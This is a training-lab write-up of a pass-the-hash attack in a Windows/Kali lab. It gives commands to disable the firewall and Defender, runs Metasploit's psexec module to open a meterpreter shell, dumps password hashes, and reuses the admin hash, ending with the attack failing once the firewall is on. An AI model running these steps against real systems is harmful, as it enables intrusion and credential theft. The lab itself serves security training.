# Pass-the-Hash
(Antisyphon training lab from Cyber Deception/Active Defense)
## Firewall/NMAP
- In cmd, turn the Windows firewall on and off using these commands: <br>
```netsh advfirewall set allprofiles state on``` <br>
```netsh advfirewall set allprofiles state off```
- In Kali Linux become root by using <br>
```sudo su -```
- I ran nmap with both the firewall off and on: <br>
```nmap {IP ADDRESS OF WINDOWS MACHINE}```<br><br>
off: <br><br>
<img width="600" alt="Picture1" src="https://github.com/user-attachments/assets/844461e5-15f1-4b90-a880-9c43e84ac0c9" /><br>
on:<br><br>
<img width="600" alt="Picture2" src="https://github.com/user-attachments/assets/aab2fbbd-7c73-4499-933f-1797bf2bb85d" /><br>
## Pass the Hash
* First disable Windows Defender with this command <br>
```Set-MpPreference -DisableRealtimeMonitoring $true ```<br>
* Ensure the firewall is set to off
* Set the admin password: <br>
```net user Administrator password1234``` <br>
* As root, start metasploit <br>
```msfconsole -q``` <br>
* Start a meterpreter shell by setting the exploit, remote host, listen host, username, and password <br>
```use exploit/windows/smb/psexec``` <br>
```set RHOST {IP OF WINDOWS MACHINE}``` <br>
```set LHOST {IP OF LINUX MACHINE}``` <br>
```set SMBUSER Administrator``` <br>
```set SMBPASS password1234``` <br>
```exploit``` <br><br>
<img width="600" alt="Picture3" src="https://github.com/user-attachments/assets/960a1685-b48e-4c3d-bfd7-b1ed378fadc0" /> <br><br>
* Next, dump password hashes with <br>
```hashdump``` <br><br>
  <img width="800" alt="Picture4" src="https://github.com/user-attachments/assets/cbbc093d-1f9d-4cf4-ae91-0c6ed3305161" /> <br><br>
* Exit the meterpreter shell with ```exit -y``` <br>
* Grab the hash of the admin account and run the following command: <br>
```set SMBPASS {HASH OF ADMIN}``` <br><br>
<img width="800" alt="Picture5" src="https://github.com/user-attachments/assets/0d7c13bf-abf7-413c-8045-2c8924e32784" /><br><br>
* After turning the firewall on again, the attack failed: <br><br>
<img width="600" alt="Picture6" src="https://github.com/user-attachments/assets/8eea3ba8-32f8-43d3-9f1c-a45c50ad8378" /><br>







